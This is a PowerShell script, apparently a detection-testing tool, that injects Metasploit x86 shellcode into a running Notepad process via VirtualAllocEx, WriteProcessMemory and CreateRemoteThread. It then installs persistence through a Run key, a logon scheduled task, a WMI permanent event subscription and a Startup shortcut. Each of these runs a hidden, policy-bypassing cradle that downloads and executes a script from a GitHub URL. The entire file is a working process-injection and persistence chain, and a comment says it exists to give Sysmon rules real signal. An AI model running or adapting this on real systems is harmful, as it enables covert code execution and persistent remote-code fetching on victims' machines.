# =========================================================================
# OPERATIONAL INJECTION VECTOR (hydra.ps1)
# Clean null-terminated calc.exe shellcode + Notepad injection + persistence
# =========================================================================

# -------------------------------------------------------------------------
# 0. Environment notes
# -------------------------------------------------------------------------
# - This shellcode is x86. Run this script with 32-bit PowerShell:
#       & "$env:WINDIR\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -File .\hydra.ps1
#   OR inject into a 32-bit target (see $Target selection below).
# - Classic Notepad is used so OpenProcess(0x1F0FFF) does not get denied
#   by AppContainer restrictions of the Win11 UWP Notepad.

# -------------------------------------------------------------------------
# 1. Target Phase: Lock onto your manually opened Notepad
# -------------------------------------------------------------------------
$Target = Get-Process -Name "notepad" -ErrorAction SilentlyContinue |
          Select-Object -First 1

if (-not $Target) {
    Write-Host "[-] Error: Notepad is not running! Open it manually first." -ForegroundColor Red
    exit 1
}

# Do NOT use $PID -- it is a reserved automatic variable in PowerShell.
$TargetPid = $Target.Id

# -------------------------------------------------------------------------
# 2. Payload Phase: Clean, canonical, null-terminated calc.exe shellcode
#    (Metasploit windows/exec CMD=calc.exe, x86)
#    The final 0x00 after "calc.exe" is the null terminator.
# -------------------------------------------------------------------------
[byte[]] $Shellcode = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,
0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,
0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,
0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,
0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,
0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,
0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,
0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,
0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,
0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,
0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,
0x65,0x00

# Quick sanity check: confirm trailing null terminator and embedded "calc.exe"
if ($Shellcode[-1] -ne 0x00) {
    Write-Host "[-] Shellcode is not null-terminated." -ForegroundColor Red
    exit 1
}
$asciiTail = -join ($Shellcode[-9..-1] | ForEach-Object {
    if ($_ -ge 32 -and $_ -le 126) { [char]$_ } else { '.' }
})
Write-Host "[*] Shellcode tail (should read 'calc.exe.'): $asciiTail"

# -------------------------------------------------------------------------
# 3. API Mapping Phase: P/Invoke signatures
#    Note: WriteProcessMemory uses 'out IntPtr' for lpNumberOfBytesWritten
#    so it can be invoked with [ref] from PowerShell.
# -------------------------------------------------------------------------
$Signature = @"
using System;
using System.Runtime.InteropServices;

public static class Win32FinalEngine
{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

if (-not ("Win32.Win32FinalEngine" -as [type])) {
    Add-Type -TypeDefinition $Signature -Namespace Win32 -ErrorAction Stop
}

$Win32 = [Win32.Win32FinalEngine]

# -------------------------------------------------------------------------
# 4. Phase Execution: In-memory injection pipeline
# -------------------------------------------------------------------------
$Handle = $Win32::OpenProcess(0x1F0FFF, $false, $TargetPid)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Host "[-] OpenProcess failed (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))." -ForegroundColor Red
    Write-Host "    Try running 32-bit PowerShell and injecting into 32-bit Notepad." -ForegroundColor Yellow
    exit 1
}

$AllocatedMemory = $Win32::VirtualAllocEx(
    $Handle,
    [IntPtr]::Zero,
    [uint32]$Shellcode.Length,
    0x3000,   # MEM_COMMIT | MEM_RESERVE
    0x40      # PAGE_EXECUTE_READWRITE
)
if ($AllocatedMemory -eq [IntPtr]::Zero) {
    Write-Host "[-] VirtualAllocEx failed (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))." -ForegroundColor Red
    [void]$Win32::CloseHandle($Handle)
    exit 1
}

$BytesWritten = [IntPtr]::Zero
$Success = $Win32::WriteProcessMemory(
    $Handle,
    $AllocatedMemory,
    $Shellcode,
    [uint32]$Shellcode.Length,
    [ref]$BytesWritten
)
if (-not $Success) {
    Write-Host "[-] WriteProcessMemory failed (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))." -ForegroundColor Red
    [void]$Win32::CloseHandle($Handle)
    exit 1
}

$ThreadHandle = $Win32::CreateRemoteThread(
    $Handle,
    [IntPtr]::Zero,
    0,
    $AllocatedMemory,
    [IntPtr]::Zero,
    0,
    [IntPtr]::Zero
)
if ($ThreadHandle -eq [IntPtr]::Zero) {
    Write-Host "[-] CreateRemoteThread failed (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))." -ForegroundColor Red
    [void]$Win32::CloseHandle($Handle)
    exit 1
}

[void]$Win32::CloseHandle($ThreadHandle)
[void]$Win32::CloseHandle($Handle)

Write-Host "[+] Injection executed. Check for calculator window!" -ForegroundColor Green

# -------------------------------------------------------------------------
# 5. Persistence Phase: registry cradle + multiple persistence mechanisms
#    Every mechanism below produces distinct Sysmon telemetry so your
#    detection rules have real signal to fire on.
# -------------------------------------------------------------------------
$repoUrl  = "https://raw.githubusercontent.com/abdira/lolbins-test/refs/heads/main/hydra.ps1"
$cradle   = "IEX (New-Object Net.WebClient).DownloadString('$repoUrl')"
$runInner = 'powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX (Get-ItemPropertyValue -Path ''HKCU:\Software\HydraEngine'' -Name Cradle)"'

# 5a. Staging key (must exist before Run key references it)
New-Item -Path "HKCU:\Software\HydraEngine" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\HydraEngine" -Name "Cradle" -Value $cradle

# 5b. HKCU Run key
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "HydraCoreUpdate" -Value $runInner

# 5c. Scheduled Task at logon
try {
    $argInner = $runInner -replace '^powershell\.exe ', ''
    $action   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $argInner
    $trigger  = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
    Register-ScheduledTask -TaskName "HydraCoreUpdateTask" `
        -Action $action -Trigger $trigger -Principal $principal `
        -Description "Hydra engine update task" -Force | Out-Null
    Write-Host "[+] Scheduled task installed." -ForegroundColor Green
} catch {
    Write-Host "[-] Scheduled task failed: $_" -ForegroundColor Yellow
}

# 5d. WMI permanent event subscription
try {
    $filterArgs = @{
        Name           = "HydraCoreFilter"
        EventNamespace = "root\cimv2"
        Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    }
    $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

    $consumerArgs = @{
        Name                = "HydraCoreConsumer"
        CommandLineTemplate = $runInner
    }
    $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
        -Arguments @{ Filter = $Filter; Consumer = $Consumer } | Out-Null
    Write-Host "[+] WMI subscription installed." -ForegroundColor Green
} catch {
    Write-Host "[-] WMI subscription failed: $_" -ForegroundColor Yellow
}

# 5e. Startup folder shortcut
try {
    $startup = [Environment]::GetFolderPath('Startup')
    $lnkPath = Join-Path $startup "HydraCoreUpdate.lnk"

    $ws = New-Object -ComObject WScript.Shell
    $sc = $ws.CreateShortcut($lnkPath)
    $sc.TargetPath  = "powershell.exe"
    $sc.Arguments   = ($runInner -replace '^powershell\.exe ', '')
    $sc.WindowStyle = 7
    $sc.Save()
    Write-Host "[+] Startup shortcut installed." -ForegroundColor Green
} catch {
    Write-Host "[-] Startup shortcut failed: $_" -ForegroundColor Yellow
}

Write-Host "[+] Persistence deployment complete." -ForegroundColor Green
